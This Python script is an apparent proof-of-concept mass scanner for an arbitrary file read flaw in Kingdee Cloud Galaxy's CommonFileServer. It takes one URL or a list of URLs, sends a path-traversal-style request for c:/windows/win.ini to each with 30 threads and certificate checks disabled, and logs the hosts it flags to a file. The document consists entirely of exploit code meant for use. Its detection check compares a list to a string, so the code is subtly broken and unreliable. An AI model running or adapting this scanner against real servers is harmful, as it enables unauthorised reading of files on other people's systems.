import requests,argparse,sys,time,re,os
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test="""
         
       ___           ___      ____  ___         _______ __                         __
      / (_)___  ____/ (_)__  / __ \/   |       / ____(_) /__  ________  ____ _____/ /
 __  / / / __ \/ __  / / _ \/ / / / /| |      / /_  / / / _ \/ ___/ _ \/ __ `/ __  / 
/ /_/ / / / / / /_/ / /  __/ /_/ / ___ |     / __/ / / /  __/ /  /  __/ /_/ / /_/ /  
\____/_/_/ /_/\__,_/_/\___/\____/_/  |_|____/_/   /_/_/\___/_/   \___/\__,_/\__,_/   
                                      /_____/                                        
                                                        version:jindieOA_Fileread 1.0.0
                                                        author:hi6                                                                 
"""
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser(description='金蝶云星空 CommonFileServer 任意文件读取')
    parser.add_argument('-u','--url',dest='url',type=str,help='Please input a url')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please input a file')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fb:
            for url in fb.readlines():
                url_list.append(url.strip())
        mp = Pool(30)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
def poc(target):
    payload = '/CommonFileServer/c:/windows/win.ini'
    header={
        'accept': '*/*',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
    }
    proxies={
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
    try:
        res = requests.get(url=target+payload,headers=header,proxies=proxies,timeout=15,verify=False)
        #print(res.text)
        match = re.findall(r'\[fonts\]',res.text)
        #print(match)
        if '[fonts]' == match:
             print(f'[+]{target} have loopholes {target+payload}')
             with open('result.txt','a',encoding='utf-8') as fn:
                 fn.write(target.strip()+'\n')
    except:
        pass
if __name__ == "__main__":
    main()
